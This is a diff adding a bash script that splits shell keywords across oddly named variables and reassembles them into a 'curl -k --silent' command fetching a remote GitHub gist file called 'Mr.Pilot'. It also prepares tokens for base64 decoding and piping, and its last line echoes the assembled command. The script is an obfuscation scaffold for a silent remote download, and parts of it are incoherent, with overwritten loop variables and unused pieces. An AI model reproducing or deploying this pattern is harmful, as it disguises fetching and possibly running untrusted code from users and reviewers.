@@ -1,0 +1,35 @@
+#!/bin/bash
+for XiX in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9 0
+do 
+  eval xXx$XiX="$XiX"
+done
+for XiX in A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 0
+do 
+  eval xXx$XiX="$XiX"
+done 
+num=0
+for n in a b c d e f g h i j
+do 	
+  eval X0X$n="$num"
+  num=$((num+1))
+done
+X0Xa=' ';
+X0Xb='echo';
+X0Xc='printf';
+X0Xd='"';
+X0Xe='curl'; 
+X0Xf='-k';
+X0Xg='--silent';
+X0Xh='base64';
+X0Xi='decode';
+X0Xj='|';
+X0Xk='-';
+X0Xm='https://gist.githubusercontent.com/KouryAbboud/a5fedfe21f5c99a7d77631f600b9154c/raw/4c496ebaa185b5da35541fa97ecf16a1834c3977/Mr.Pilot'
+#curl -k --silent https://gist.githubusercontent.com/KouryAbboud/a5fedfe21f5c99a7d77631f600b9154c/raw/4c496ebaa185b5da35541fa97ecf16a1834c3977/Mr.Pilot
+<< EOF
+ori kode
+$X0Xe$X0Xa$X0Xf$X0Xa$X0Xg$X0Xa$X0Xm
+EOF
+
+# reverse
+echo $X0Xe$X0Xa$X0Xf$X0Xa$X0Xg$X0Xa$X0Xm
